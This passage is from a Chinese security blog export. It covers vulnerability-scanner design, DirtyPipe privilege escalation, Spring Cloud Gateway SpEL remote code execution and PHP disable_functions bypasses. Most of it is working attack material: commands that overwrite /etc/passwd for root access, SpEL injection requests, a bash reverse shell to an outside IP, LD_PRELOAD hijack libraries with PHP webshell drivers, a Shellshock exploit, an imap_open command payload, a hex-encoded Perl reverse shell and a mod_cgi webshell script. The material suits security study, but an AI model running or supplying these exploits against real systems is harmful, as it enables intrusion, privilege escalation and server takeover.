在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描 优点 速度快准确率较高，漏洞规则库较为全面。 报表功能完整且美观。 漏洞验证可查看请求响应代码 缺点 无中文界面。 扫描器常见问题 WEB漏洞扫描器的好坏取决于爬行页面数、漏洞库数量、扫描效率、误报率等等 误报 不可避免，但是要尽量减少 减少手段 推广，进行实战测试，去除或者修改误报率高的POC 漏洞检测 插件分类 参考awvs 流量去重 重复请求包的定义是域名及协议和url路径相同，同时参数的key是完全一致。 像这种为重复 https://www.beysec.com/test.php?id=2&amp;name=bey0nd https://www.beysec.com/test.php?id=6&amp;name=zhangsan 这种则需要再次扫描 https://www.beysec.com/test.php?id=2&amp;name=bey0nd https://www.beysec.com/test.php?id=6&amp;name=zhangsan&amp;data=hello 识别同一错误页面 访问肯定不存在页面，得到返回内容然后对比相似度&gt;90 大量请求造成拒绝服务或扫描行为被入侵检测设备发现 伪造请求假装正常用户交互 根据响应，提示是否放缓请求速度 代理 将所有执行扫描任务的 worker 的测试流量全转发到 proxy 服务器上，由 proxy 服务器统一调度发送测试请求频率，直接使用 proxy 方案优点是可以兼容之前没做限速功能的扫描器，缺点是所有基于 time based 的检测均无效(当然也可以让 proxy 返回真正的响应时间来进行判断，不过仍需要修改检测模块)，也不允许在检测模块中加入超时设置。 双重队列 ​ 1.worker1 从队列中取到名为 target1 的任务 ​ 2.worker1 从 target1 队列中取出和 target1 相关的任务 ​ 3.默认单并发执行和 target1 相关任务，根据设置的 QPS 限制，主动 sleep 或者增加并发 漏洞特征库 及时跟进国内外最新漏洞 ","link":"https://liangyueliangyue.github.io/post/lou-dong-sao-miao-qi-xue-xi/"},{"title":"DirtyPipe(脏管道)提权","content":"DirtyPipe提权 CVE-2022-0847 漏洞详情 新管道缓冲区结构的“flags”成员在 Linux 内核中的 copy_page_to_iter_pipe 和 push_pipe 函数中缺乏正确初始化的方式存在缺陷，因此可能包含陈旧的值。非特权本地用户可通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root。CVE-2022-0847 的漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe” 漏洞范围 version &gt; 5.8 version &lt; 5.16.11、5.15.25、5.10.102 漏洞复现 现在存在两个POC POC-1 https://dirtypipe.cm4all.com/ https://github.com/imfiver/CVE-2022-0847/blob/main/Dirty-Pipe.sh 这里的sh脚本添加了以下命令 gcc exp.c -o exp -std=c99 # 备份密码文件 cp /etc/passwd /tmp/passwd passwd_tmp=$(cat /etc/passwd|head) ./exp /etc/passwd 1 &quot;${passwd_tmp/root:x/oot:}&quot; echo -e &quot;\\n# 恢复原来的密码\\nrm -rf /etc/passwd\\nmv /tmp/passwd /etc/passwd&quot; # 现在可以无需密码切换到root账号 su root 原理 首先编译，编译后备份密码文件然后通过exp去写/etc/passwd来提权。将root所在的那一行，第一个冒号后面的x去掉 /etc/passwd的第二列通常设置为x，表示用户密码保存在/etc/shadow中，而/etc/shadow文件只有root用户可以读取和写入，这样就保护了密码哈希不能被第三方爆破。 最后在后面用户描述的位置多加一个字符，补齐文件长度。最后成功修改/etc/passwd，然后再使用su即可直接免密码切换到root了。 git clone https://github.com/imfiver/CVE-2022-0847.git cd CVE-2022-0847 chmod +x Dirty-Pipe.sh bash Dirty-Pipe.sh 然后因为修改了原来密码还需要进行恢复操作 rm -rf /etc/passwd mv /tmp/passwd /etc/passwd POC-2 curl -O https://haxx.in/files/dirtypipez.c 查找具有suid权限的可执行文件 find / -user root -perm /4000 2&gt;/dev/null 编译POC文件后，指定修改的Suid可执行文件，获取root权限 原理 直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来 总结 漏洞利用比脏牛还简单且无硬性要求，但是影响内核比较新。在面对比较新的内核系统时可积极使用 ","link":"https://liangyueliangyue.github.io/post/dirtypipezang-guan-dao-ti-quan/"},{"title":"Spring Cloud Gateway Rce","content":"Spring Cloud Gateway rce cve-2022-22947 漏洞描述： Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。 也是codeql发现的 漏洞影响： 3.1.0 3.0.0至3.0.6 3.0.0之前的版本 复现漏洞 首先，发送以下请求以添加包含恶意SpEL 表达式的路由器： POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 333 { &quot;id&quot;: &quot;hacktest&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: { &quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;id\\&quot;}).getInputStream()))}&quot; } }], &quot;uri&quot;: &quot;http://example.com&quot; } 反弹shell将命令替换为base64命令即可 Content-Type: application/json 其次，刷新网关路由器。SpEL 表达式将在此步骤中执行： POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 第三，发送以下请求以检索结果： GET /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 查看所有路由 GET /actuator/gateway/routes HTTP/1.1 Host: 123.58.236.76:40279 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 最后，发送一个 DELETE 请求来删除我们的恶意路由器： DELETE /actuator/gateway/routes/lyy9 HTTP/1.1 Host: 123.58.236.76:40279 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 0 Content-Type: application/json 删除后用记得也用refresh 反弹shell POST /actuator/gateway/routes/hacktest HTTP/1.1 Host: 192.168.159.132:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close Content-Type: application/json Content-Length: 333 { &quot;id&quot;: &quot;hacktest&quot;, &quot;filters&quot;: [{ &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: { &quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\&quot;bash -c {echo,反弹shellbase64}|{base64,-d}|{bash,-i}\\&quot;).getInputStream()))}&quot; } }], &quot;uri&quot;: &quot;http://example.com&quot; } 删去new String[]初始化，直接将base64的反弹shell命令放入填入 生成base64那个站点崩了，可以自己写个python import base64 base64_str = input(&quot;请输入反弹shell命令,如：bash -i &gt;&amp; /dev/tcp/11.11.11.11/2334 0&gt;&amp;1\\n&quot;) res = base64.b64encode(base64_str.encode()) print(&quot;bash -c {echo,&quot;+res.decode()+&quot;}|{base64,-d}|{bash,-i}&quot;) 漏洞原理 SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行 如果想要深入学习SpEL表达式可以参考Mi1k7ea师傅的文章 https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/ 首先定位到漏洞的修复版本对比 https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e 可以看到删除了默认的StandardEvaluationContext，改用自定义的GatewayEvaluationContext来对表达式进行SpEL进行处理 默认的StandardEvaluationContext里getValue方法 static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) { Object value; String rawValue = entryValue; if (rawValue != null) { rawValue = rawValue.trim(); } if (rawValue != null &amp;&amp; rawValue.startsWith(&quot;#{&quot;) &amp;&amp; entryValue.endsWith(&quot;}&quot;)) { // assume it's spel StandardEvaluationContext context = new StandardEvaluationContext(); context.setBeanResolver(new BeanFactoryResolver(beanFactory)); Expression expression = parser.parseExpression(entryValue, new TemplateParserContext()); value = expression.getValue(context); } else { value = entryValue; } return value; } 可以控制 getValue 方法调用,那么就能调用任何有效的表达式达到注入效果 修复建议 3.1.x用户应升级到3.1.1+ 3.0.x用户应升级到3.0.7+ 如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用 如果需要Actuator端点，则应使用Spring Security对其进行保护 ","link":"https://liangyueliangyue.github.io/post/spring-cloud-gateway-rce/"},{"title":"php disable_function绕过","content":"bypass disable_functions disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。 要进行添加的话在php.ini中添加即可，每个函数之间使用逗号隔开。 配置 打开php.ini，搜索disable_function，添加如下函数 eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen 重启web服务，更改index.php,查看输出 &lt;?php eval(var_dump(1)); phpinfo(); 发现成功执行了eval函数，但是disable_function中确实禁止了eval 因为eval是语言构造器,不是函数，放在disable_functions中是无法禁用的，如果想禁掉eval可以用php的扩展 Suhosin 基础绕过 危险函数 exec shell_exec system passthru popen proc_open pcntl_exec Windows com组件拓展 要求： 开启COM组件（5.4自带其他版本自己添加） com_dotnet 上传脚本 &lt;?php $command = $_GET['cmd']; $wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能 $exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput; ?&gt; Linux 环境变量LD_preload 劫持sendmail中getuid 条件： mail()函数和error_log()函数未被全部禁用 函数所调用的sendmail命令已安装 centos默认安装的 ubantu则默认不安装 基本原理 通过环境变量 LD_PRELOAD 劫持系统函数，来突破 disable_functions 限制执行操作系统命令。 LD_PRELOAD是Linux系统的下一个有趣的环境变量： “它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。 so就像windows的dll，可以写入，也可以覆盖然后利用LD_preload来优先加载so动态链接库 sendmail函数在运行过程动态调用了很多标准库函数 readelf -Ws /usr/sbin/sendmail 构造poc思路 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so； 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象； 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持； 1.编制我们自己的动态链接程序，代码如下（功能是执行mkdir test）执行编译为一个动态共享库的命令如下 gcc -shared -fPIC test.c -o test.so #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int geteuid() { const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); system(cmdline); } 2.利用webshell，上传编译后的a.so到目标服务器 3.通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下 &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt; 这里接受3个参数 一是cmd参数，待执行的系统命令 二是outpath参数，保存命令执行输出结果的文件路径，便于在页面上显示，另外该参数，你应注意web是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除等几点 三是sopath参数，指定劫持系统函数的共享对象的绝对路径。 这里通过putenv()函数将LD_PRELOAD环境变量设置为恶意的test.so 将自定义的EVIL_CMDLINE环境变量赋值为要执行的命令； 然后调用mail()函数触发sendmail()，再通过sendmail()触发getuid()从而使恶意的test.so被加载执行 最后再输出内容到页面上并删除临时存放命令执行结果的文件。 劫持启动进程 GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 攻击利用 bypass_disablefunc.c #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } 通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。所以用environ来进行 删除环境变量 接着用以下语句编译C文件为共享对象文件： gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so bypass_disablefunc.php，代码和test.php一致： &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt; Bash破壳（CVE-2014-6271） 前提条件 目标OS存在Bash破壳（CVE-2014-6271）漏洞 被攻击的bash存在漏洞（版本小于等于4.3） 攻击者可以控制环境变量 新的bash进程被打开触发漏洞并执行命令 该漏洞存在于bash 1.14 - 4.3版本中，受影响的Linux系统包括：Red Hat企业Linux (versions 4 ~7) 、Fedora distribution、CentOS (versions 5 ~7)、Ubuntu 10.04 LTS,12.04 LTS和14.04 LTS、Debian等 以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令 验证 env x='() { :;}; echo vulnerable' bash –c &quot;echo This is a test&quot; POC中定义变量x为() { :;}; echo vulnerable，它会变成函数，于bash中的函数定义有关。 bash解析函数后，会继续执行后面的代码，原因在于parse_and_execute函数。 若存在漏洞，将会回显： vulnerable This is a test poc &lt;?php function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don't actuallysend any mail $output = @file_get_contents($tmp); @unlink($tmp); if($output != &quot;&quot;) return $output; else return &quot;No output, or not vuln.&quot;; } echo shellshock($_REQUEST[&quot;cmd&quot;]); ?&gt; php能够通过putenv设置环境变量，同时mail函数存在第五个参数时会执行popen() 如果系统默认sh是bash，popen()会派生bash进程，这种函数不仅仅mail，还有imap_mail等 imap拓展 也没成功 前提： 安装PHP的imap扩展 在php.ini中开启imap.enable_insecure_rsh选项为On 基本原理 简单地说，就是imap_open()函数会调用到rsh的程序，而该程序中会调用execve系统调用来实现rsh的调用，其中的邮件地址参数是由imap_open()函数的mailbox参数传入，同时，由于rsh命令是ssh命令的符号链接，所以当我们利用ssh的-oProxyCommand参数来构造恶意mailbox参数时就能执行恶意命令。 imap_open() Poc 先判断是否存在imap_open()函数，然后构造exp执行通过外部GET输入的命令然后保存结果到本地文件中，最后输出结果文件内容，注意sleep(5)是为了等imap_open()函数执行完、因为该函数执行时需要DNS轮询会存在延时： &lt;?php error_reporting(0); if (!function_exists('imap_open')) { die(&quot;no imap_open function!&quot;); } $server = &quot;x -oProxyCommand=echo$IFS$()&quot; . base64_encode($_GET['cmd'] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64$IFS$()-d|sh}&quot;; imap_open('{' . $server . ':143/imap}INBOX', '', '')or die(&quot;\\n\\nError: &quot;.imap_last_error()); sleep(5); echo file_get_contents(&quot;/tmp/cmd_result&quot;); ?&gt; pcntl拓展 前提是PHP安装并启用了pcntl插件。 ubuntu18 apt安装的php默认没有这个拓展，需要手动下载编译前提条件 ubuntu编译可以参考 https://www.cnblogs.com/mangyusisha/p/5867370.html 基本原理 原理比较简单，就是利用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令，从而Bypass黑名单。 Bypass 反弹shell &lt;?php $ip = 'xx.xx.xx.xx'; $port = '7000'; $file = '/tmp/bc.pl'; header(&quot;content-Type: text/html; charset=gb2312&quot;); if(function_exists('pcntl_exec')) { $data = &quot;\\x23\\x21\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x70\\x65\\x72\\x6c\\x20\\x2d\\x77\\x0d\\x0a\\x23\\x0d\\x0a&quot;. &quot;\\x0d\\x0a\\x75\\x73\\x65\\x20\\x73\\x74\\x72\\x69\\x63\\x74\\x3b\\x20\\x20\\x20\\x20\\x0d\\x0a\\x75\\x73\\x65\\x20&quot;. &quot;\\x53\\x6f\\x63\\x6b\\x65\\x74\\x3b\\x0d\\x0a\\x75\\x73\\x65\\x20\\x49\\x4f\\x3a\\x3a\\x48\\x61\\x6e\\x64\\x6c\\x65&quot;. &quot;\\x3b\\x0d\\x0a\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x69\\x70\\x20\\x3d\\x20\\x27&quot;.$ip. &quot;\\x27\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x70\\x6f\\x72\\x74\\x20\\x3d\\x20\\x27&quot;.$port. &quot;\\x27\\x3b\\x0d\\x0a\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x70\\x72\\x6f\\x74\\x6f\\x20\\x3d\\x20\\x67\\x65\\x74\\x70\\x72&quot;. &quot;\\x6f\\x74\\x6f\\x62\\x79\\x6e\\x61\\x6d\\x65\\x28\\x22\\x74\\x63\\x70\\x22\\x29\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24&quot;. &quot;\\x70\\x61\\x63\\x6b\\x5f\\x61\\x64\\x64\\x72\\x20\\x3d\\x20\\x73\\x6f\\x63\\x6b\\x61\\x64\\x64\\x72\\x5f\\x69\\x6e&quot;. &quot;\\x28\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x70\\x6f\\x72\\x74\\x2c\\x20\\x69\\x6e\\x65\\x74\\x5f\\x61\\x74\\x6f&quot;. &quot;\\x6e\\x28\\x24\\x72\\x65\\x6d\\x6f\\x74\\x65\\x5f\\x69\\x70\\x29\\x29\\x3b\\x0d\\x0a\\x6d\\x79\\x20\\x24\\x73\\x68&quot;. &quot;\\x65\\x6c\\x6c\\x20\\x3d\\x20\\x27\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x69\\x27\\x3b\\x0d\\x0a\\x73\\x6f&quot;. &quot;\\x63\\x6b\\x65\\x74\\x28\\x53\\x4f\\x43\\x4b\\x2c\\x20\\x41\\x46\\x5f\\x49\\x4e\\x45\\x54\\x2c\\x20\\x53\\x4f\\x43&quot;. &quot;\\x4b\\x5f\\x53\\x54\\x52\\x45\\x41\\x4d\\x2c\\x20\\x24\\x70\\x72\\x6f\\x74\\x6f\\x29\\x3b\\x0d\\x0a\\x53\\x54\\x44&quot;. &quot;\\x4f\\x55\\x54\\x2d\\x3e\\x61\\x75\\x74\\x6f\\x66\\x6c\\x75\\x73\\x68\\x28\\x31\\x29\\x3b\\x0d\\x0a\\x53\\x4f\\x43&quot;. &quot;\\x4b\\x2d\\x3e\\x61\\x75\\x74\\x6f\\x66\\x6c\\x75\\x73\\x68\\x28\\x31\\x29\\x3b\\x0d\\x0a\\x63\\x6f\\x6e\\x6e\\x65&quot;. &quot;\\x63\\x74\\x28\\x53\\x4f\\x43\\x4b\\x2c\\x24\\x70\\x61\\x63\\x6b\\x5f\\x61\\x64\\x64\\x72\\x29\\x20\\x6f\\x72\\x20&quot;. &quot;\\x64\\x69\\x65\\x20\\x22\\x63\\x61\\x6e\\x20\\x6e\\x6f\\x74\\x20\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x3a\\x24\\x21&quot;. &quot;\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x49\\x4e\\x2c\\x20\\x22\\x3c\\x26\\x53\\x4f\\x43\\x4b&quot;. &quot;\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x4f\\x55\\x54\\x2c\\x20\\x22\\x3e\\x26\\x53\\x4f\\x43&quot;. &quot;\\x4b\\x22\\x3b\\x0d\\x0a\\x6f\\x70\\x65\\x6e\\x20\\x53\\x54\\x44\\x45\\x52\\x52\\x2c\\x20\\x22\\x3e\\x26\\x53\\x4f&quot;. &quot;\\x43\\x4b\\x22\\x3b\\x0d\\x0a\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x24\\x73\\x68\\x65\\x6c\\x6c\\x29\\x3b\\x0d\\x0a&quot;. &quot;\\x63\\x6c\\x6f\\x73\\x65\\x20\\x53\\x4f\\x43\\x4b\\x3b\\x0d\\x0a\\x65\\x78\\x69\\x74\\x20\\x30\\x3b\\x0a&quot;; $fp = fopen($file,'w'); $key = fputs($fp,$data); fclose($fp); if(!$key) exit('写入'.$file.'失败'); chmod($file,0777); pcntl_exec($file); unlink($file); } else { echo '不支持pcntl扩展'; } ?&gt; tips:网页请求时无法正常运作是正常的 防御方法 disable_functions的黑名单中添加pcntl相关函数实现禁用 内存漏洞 https://github.com/mm0r1/exploits 原理： 各种内存漏洞，pwn大佬 适用 php7以上 Apache mod Cgi 前提 Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了 cgi、rewrite Web 目录给了 AllowOverride 权限 当前目录可写 原理 Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下： Options +ExecCGI AddHandler cgi-script .xxx 这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions。 这里环境比较复杂，所以用蚁剑的labs来快速搭建 git clone https://github.com/AntSwordProject/AntSword-Labs.git cd bypass_disable_functions/3 docker-compose up -d 访问 http://192.168.159.132:18080/ 直接连接无法执行 并且发现目标主机Apache开启了CGI，Web目录下有写入的权限。 我们首先在当前目录创建 .htaccess 文件，写入如下： Options +ExecCGI AddHandler cgi-script .ant 然后新建 shell.ant 文件，写入要执行的命令： #!/bin/sh echo Content-type: text/html echo &quot;&quot; echo&amp;&amp;id 访问shell.ant 一条龙poc &lt;?php $cmd = &quot;ls /&quot;; //command to be executed $shellfile = &quot;#!/bin/bashn&quot;; //using a shellscript $shellfile .= &quot;echo -ne &quot;Content-Type: text/html\\n\\n&quot;n&quot;; //header is needed, otherwise a 500 error is thrown when there is output $shellfile .= &quot;$cmd&quot;; //executing $cmd function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter { echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;n&quot;; } if (!isset($_GET['checked'])) { @file_put_contents('.htaccess', &quot;nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked } else { $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled? $writable = is_writable('.'); //current dir writable? $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled? checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;); checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;); checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;); if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) { echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not } else { checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //make a backup, cause you never know. checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents('.htaccess',&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //.dizzle is a nice extension checkEnabled(&quot;Write shell file&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //write the file checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); //rwx echo &quot;Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;&quot;; //call the script } } ?&gt; shell.dizzle文件，命令为$cmd PHP-fpm 使用条件： 目标使用了php-fpm模块 php-fpm的进程端口暴露在外网（一般为9000端口） 知道一个php脚本的绝对路径和名称 PHP-FPM FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给谁呢? 其实就是发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。 由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和fpm进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。 因为前面我们了解了协议原理和内容，接下来就是使用CGI协议封装请求，通过Socket来直接与FPM通信。 第一个限制 既然是请求，那么SCRIPT_FILENAME就相当的重要，因为前面说过，fpm是根据这个值来执行PHP文件文件的，如果不存在，会直接返回404，所以想要利用好这个漏洞，就得找到一个已经存在的PHP文件，好在一般进行源安装PHP的时候，服务器都会附带上一些PHP文件，如果说我们没有收集到目标Web目录的信息的话，可以试试这种办法. 第二个限制 